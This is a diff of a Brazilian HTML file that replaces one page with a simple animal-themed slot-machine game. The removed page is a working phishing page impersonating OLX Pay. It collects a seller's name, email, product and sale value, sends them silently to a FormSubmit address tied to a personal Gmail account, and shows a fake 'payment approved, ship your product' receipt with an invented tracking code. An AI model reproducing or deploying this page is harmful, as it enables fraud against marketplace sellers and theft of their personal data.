@@ -1,226 +1,120 @@
-<!DOCTYPE html>
-<html lang="pt-br">
+<!DOCTYPE html><html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>OLX Pay - Confirmação de Venda</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bichinhos da Sorte</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f5f5f5;
-      color: #333;
-      max-width: 500px;
-      margin: 30px auto;
-      padding: 20px;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      background-color: #fff;
-    }
-
-    h2, h3, h1 {
-      color: #ff6600;
-      text-align: center;
-    }
-
-    label {
-      display: block;
-      margin-top: 15px;
-      font-weight: bold;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-
-    .btn {
-      margin-top: 20px;
-      width: 100%;
-      background-color: #ff6600;
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: url('https://i.imgur.com/Mk6gGR2.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
       color: #fff;
-      padding: 12px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
     }
-
-    .hidden {
-      display: none;
-    }
-
-    .confirmacao, .final {
-      background: #f9f9f9;
-      border: 1px solid #ddd;
-      border-radius: 10px;
+    .container {
+      background: rgba(0, 0, 0, 0.8);
       padding: 20px;
-      margin-top: 30px;
-    }
-
-    .status {
-      background-color: #ffebcc;
-      padding: 15px;
-      border-radius: 5px;
-      margin-top: 20px;
-      font-weight: bold;
-      color: #995700;
-      border: 1px solid #ffcc80;
-    }
-
-    .footer {
-      margin-top: 30px;
-      font-size: 13px;
-      color: #777;
+      border-radius: 15px;
       text-align: center;
+      box-shadow: 0 0 20px #ffcc00;
     }
-
-    .link-confirmar, .link-site {
-      display: inline-block;
-      background-color: #ff6600;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 5px;
-      text-decoration: none;
+    .balance {
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+    .slot {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .slot img {
+      width: 90px;
+      height: 90px;
+      margin: 0 10px;
+      border-radius: 15px;
+      background: #fff;
+      animation: spin 0.6s ease-in-out;
+    }
+    .play-btn {
+      padding: 12px 30px;
+      font-size: 18px;
+      background-color: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 10px;
       font-weight: bold;
-      font-size: 15px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-      margin-top: 20px;
-      cursor: pointer;
+      box-shadow: 0 0 10px #fff;
     }
-
-    .center {
-      text-align: center;
-      margin-top: 20px;
+    .result {
+      margin-top: 15px;
+      font-size: 18px;
+      font-weight: bold;
     }
-
-    #barraCarregamento, #barraCarregamento2 {
-      width: 0;
-      height: 5px;
-      background-color: #ff6600;
-      transition: width 3s;
-      margin-top: 20px;
+    @keyframes spin {
+      0% { transform: scale(0.5) rotateX(180deg); opacity: 0.5; }
+      100% { transform: scale(1) rotateX(0deg); opacity: 1; }
     }
   </style>
 </head>
 <body>
-
-  <!-- Tela de Formulário -->
-  <div id="formulario">
-    <h2>
-      <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Cadeado" style="width:20px;vertical-align:middle;margin-right:5px;">
-      OLX Pay - Confirmação de Venda
-    </h2>
-
-    <form id="vendaForm">
-      <label for="nome">Seu nome completo:</label>
-      <input type="text" id="nome" name="nome" required>
-
-      <label for="email">Seu e-mail OLX:</label>
-      <input type="email" id="email" name="email" required>
-
-      <label for="produto">Produto vendido:</label>
-      <input type="text" id="produto" name="produto" required>
-
-      <label for="valor">Valor da venda (R$):</label>
-      <input type="text" id="valor" name="valor" required>
-
-      <button type="submit" class="btn">Confirmar venda</button>
-    </form>
-  </div>
-
-  <!-- Barra de carregamento entre formulário e comprovante -->
-  <div id="barraCarregamento"></div>
-
-  <!-- Tela de Comprovante -->
-  <div id="comprovante" class="confirmacao hidden">
-    <h3>Pagamento aprovado – envie seu produto</h3>
-    <p><strong>Produto vendido:</strong> <span id="produtoInfo"></span></p>
-    <p><strong>Valor:</strong> <span id="valorInfo"></span></p>
-    <p><strong>Forma de envio:</strong> Motoboy OLX Pay (entrega hoje)</p>
-    <p><strong>Código de postagem:</strong> BR345671234BR</p>
-
-    <div class="status">
-      Pagamento aprovado e aguardando confirmação do vendedor.
+  <div class="container">
+    <div class="balance" id="balance">Saldo: R$ 100,00</div>
+    <div class="slot" id="slots">
+      <img src="https://i.imgur.com/nxQwD9G.png" alt="animal">
+      <img src="https://i.imgur.com/qc6x0jI.png" alt="animal">
+      <img src="https://i.imgur.com/Fiyt5y7.png" alt="animal">
     </div>
-
-    <div class="center">
-      <span class="link-confirmar" onclick="iniciarCarregamento2()">Clique aqui para confirmar a transação</span>
-    </div>
-
-    <div class="footer">
-      Você receberá um e-mail de confirmação com os detalhes da transação.<br>
-      OLX Pay é um serviço de pagamento seguro com garantia de entrega.
-    </div>
-  </div>
-
-  <!-- Barra de carregamento entre comprovante e tela final -->
-  <div id="barraCarregamento2" class="hidden"></div>
-
-  <!-- Tela Final -->
-  <div id="final" class="final hidden">
-    <h1>Parabéns!</h1>
-    <p style="text-align: center; font-size: 16px; margin-top: 10px;">
-      Sua confirmação foi recebida com sucesso.<br><br>
-      Você receberá um <strong>e-mail de confirmação</strong> com todos os detalhes em instantes.<br><br>
-      Obrigado por utilizar o OLX Pay.
-    </p>
-
-    <div class="center">
-      <a class="link-site" href="https://www.olx.com.br" target="_blank">Ir para o site oficial da OLX</a>
-    </div>
-  </div>
+    <button class="play-btn" onclick="playGame()">Jogar Agora</button>
+    <div class="result" id="result"></div>
+  </div><audio id="spin-sound" src="https://cdn.pixabay.com/audio/2022/10/04/audio_c46ad19f45.mp3"></audio> <audio id="win-sound" src="https://cdn.pixabay.com/audio/2021/08/04/audio_c5d24f7f3f.mp3"></audio> <audio id="lose-sound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_98c47e5c95.mp3"></audio>
 
   <script>
-    document.getElementById("vendaForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+    const imagens = [
+      "https://i.imgur.com/nxQwD9G.png", // panda
+      "https://i.imgur.com/qc6x0jI.png", // raposa
+      "https://i.imgur.com/Fiyt5y7.png", // koala
+      "https://i.imgur.com/Y8rIoRj.png"  // papagaio
+    ];
 
-      const form = e.target;
-      const dados = {
-        nome: form.nome.value,
-        email: form.email.value,
-        produto: form.produto.value,
-        valor: form.valor.value
-      };
+    let saldo = 100;
 
-      // Inicia barra de carregamento visual
-      const barra = document.getElementById("barraCarregamento");
-      barra.style.width = "0";
-      barra.classList.remove("hidden");
-      setTimeout(() => { barra.style.width = "100%"; }, 10);
+    function playGame() {
+      document.getElementById('spin-sound').play();
+      const slots = document.getElementById('slots').children;
+      const resultado = [];
 
-      // Após carregar, mostra comprovante
-      setTimeout(() => {
-        document.getElementById("formulario").classList.add("hidden");
-        barra.classList.add("hidden");
-        document.getElementById("comprovante").classList.remove("hidden");
-        document.getElementById("produtoInfo").innerText = dados.produto;
-        document.getElementById("valorInfo").innerText = "R$ " + dados.valor;
-      }, 3000);
-
-      // Envia dados para o FormSubmit
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(dados)
-      });
-    });
-
-    function iniciarCarregamento2() {
-      const barra2 = document.getElementById("barraCarregamento2");
-      barra2.style.width = "0";
-      barra2.classList.remove("hidden");
-      setTimeout(() => { barra2.style.width = "100%"; }, 10);
+      for (let i = 0; i < slots.length; i++) {
+        slots[i].style.animation = 'spin 0.6s ease-in-out';
+      }
 
       setTimeout(() => {
-        document.getElementById("comprovante").classList.add("hidden");
-        barra2.classList.add("hidden");
-        document.getElementById("final").classList.remove("hidden");
-      }, 3000);
+        for (let i = 0; i < slots.length; i++) {
+          const index = Math.floor(Math.random() * imagens.length);
+          slots[i].src = imagens[index];
+          resultado.push(index);
+        }
+
+        const ganhou = resultado.every((val, i, arr) => val === arr[0]);
+        const resultText = document.getElementById('result');
+        const balanceDisplay = document.getElementById('balance');
+
+        if (ganhou) {
+          saldo += 50;
+          resultText.innerText = "Você GANHOU R$ 50,00!";
+          document.getElementById('win-sound').play();
+        } else {
+          saldo -= 10;
+          resultText.innerText = "Você perdeu R$ 10,00.";
+          document.getElementById('lose-sound').play();
+        }
+
+        balanceDisplay.innerText = `Saldo: R$ ${saldo.toFixed(2)}`;
+      }, 600);
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
